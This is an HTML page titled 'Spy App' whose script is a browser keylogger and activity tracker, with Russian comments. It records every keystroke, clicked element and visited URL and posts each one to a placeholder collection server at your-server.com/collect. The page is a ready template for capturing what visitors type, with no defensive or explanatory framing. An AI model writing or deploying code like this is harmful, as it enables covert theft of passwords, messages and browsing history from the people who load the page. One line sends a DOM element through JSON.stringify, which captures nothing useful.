<!DOCTYPE html>
<html>
<head>
    <title>Spy App</title>
    <script>
        function sendData(data) {
            fetch('https://your-server.com/collect', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            });
        }

        document.addEventListener('click', function(event) {
            sendData({ type: 'click', data: event.target });
        });

        // Добавить другие события, такие как навигация по сайту, нажатия клавиш и т.д.
        document.addEventListener('keydown', function(event) {
            sendData({ type: 'keydown', data: event.key });
        });

        // Пример для сбора данных о посещаемых сайтах
        document.addEventListener('visibilitychange', function() {
            if (document.visibilityState === 'visible') {
                sendData({ type: 'visibilitychange', data: document.location.href });
            }
        });
    </script>
</head>
<body>
    <h1>Welcome to Spy App</h1>
    <p>This app will collect your data and send it to the server.</p>
</body>
</html>
